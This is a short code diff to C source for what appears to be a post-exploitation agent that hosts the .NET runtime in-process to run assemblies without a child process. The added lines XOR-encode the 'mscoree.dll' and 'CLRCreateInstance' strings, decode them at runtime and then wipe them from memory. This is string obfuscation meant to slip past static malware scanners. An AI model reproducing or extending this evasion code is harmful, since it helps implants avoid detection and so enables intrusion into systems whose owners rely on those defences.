@@ -14,6 +14,7 @@
  * This avoids spawning any child process — the assembly runs in-process.
  */
 #include "agent.h"
+#include "api_resolve.h"
 #include <objbase.h>
 
 /* GUID_NULL is needed by IID_NULL — provide it if not linked with uuid.lib */
@@ -137,11 +138,17 @@ static BOOL g_clr_initialized = FALSE;
 static BOOL clr_init(void) {
     if (g_clr_initialized) return TRUE;
 
-    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
+    char _sm[] = {'m'^0x5A,'s'^0x5A,'c'^0x5A,'o'^0x5A,'r'^0x5A,'e'^0x5A,'e'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sm[_i];_i++) _sm[_i]^=0x5A;
+    HMODULE hMscoree = LoadLibraryA(_sm);
+    SecureZeroMemory(_sm, sizeof(_sm));
     if (!hMscoree) return FALSE;
 
+    char _sc[] = {'C'^0x5A,'L'^0x5A,'R'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'I'^0x5A,'n'^0x5A,'s'^0x5A,'t'^0x5A,'a'^0x5A,'n'^0x5A,'c'^0x5A,'e'^0x5A,0};
+    for(int _i=0;_sc[_i];_i++) _sc[_i]^=0x5A;
     CLRCreateInstanceFn pCLRCreateInstance =
-        (CLRCreateInstanceFn)GetProcAddress(hMscoree, "CLRCreateInstance");
+        (CLRCreateInstanceFn)GetProcAddress(hMscoree, _sc);
+    SecureZeroMemory(_sc, sizeof(_sc));
     if (!pCLRCreateInstance) return FALSE;
 
     ICLRMetaHost *meta_host = NULL;
